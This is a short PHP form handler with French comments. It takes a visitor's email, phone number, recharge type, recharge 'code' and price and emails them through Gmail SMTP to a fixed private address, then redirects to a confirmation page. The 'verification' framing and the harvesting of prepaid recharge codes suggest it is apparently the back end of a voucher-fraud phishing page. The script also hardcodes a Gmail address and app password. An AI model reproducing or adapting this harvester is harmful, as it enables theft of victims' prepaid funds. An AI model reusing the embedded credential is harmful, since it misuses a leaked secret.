<?php
// Paramètres de connexion MySQL
$host = "localhost";
$user = "root";   // à changer selon ton serveur
$pass = "";       // mot de passe MySQL (par défaut vide sous Laragon/XAMPP)
$dbname = "check_db";

// Connexion à la base
$conn = new mysqli($host, $user, $pass, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Erreur de connexion : " . $conn->connect_error);
};
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

if (isset($_POST['submit'])) {
    // Récupération des données du formulaire
    $email    = htmlspecialchars($_POST['email'] ?? '');
    $numero   = htmlspecialchars($_POST['number'] ?? '');
    $recharge = isset($_POST['recharge']) ? htmlspecialchars($_POST['recharge']) : "Non spécifié";
    $code     = htmlspecialchars($_POST['code'] ?? '');
    $prix     = htmlspecialchars($_POST['prix'] ?? '');

    // Initialiser PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuration serveur Gmail
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'johnhgv918@gmail.com'; // ⚠️ ton adresse Gmail
        $mail->Password   = 'luqy octc avmz wudy'; // ⚠️ mot de passe d’application Gmail
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // Expéditeur
        $mail->setFrom('johnhgv918@gmail.com', 'Formulaire Vérification');

        // Destinataire
        $mail->addAddress('johnhgv918@gmail.com'); // ⚠️ tu peux mettre une autre adresse

        // Contenu du mail
        $mail->isHTML(true);
        $mail->Subject = "Nouvelle soumission de formulaire";
        $mail->Body    = "
            <h2>Nouvelle soumission</h2>
            <p><b>Email :</b> $email</p>
            <p><b>Numéro :</b> $numero</p>
            <p><b>Type de recharge :</b> {$recharge}</p>
            <p><b>Code :</b> {$code}</p>
            <p><b>Prix :</b> $prix</p>
        ";

        // Envoi
        if ($mail->send()) {
            // ✅ Redirection vers confirmation.php
            header("Location: confirmation.php");
            exit;
        } else {
            echo "❌ Erreur lors de l'envoi du mail.";
        }

    } catch (Exception $e) {
        echo "❌ Le message n'a pas pu être envoyé. Erreur : {$mail->ErrorInfo}";
    }
}
$conn->close();
?>
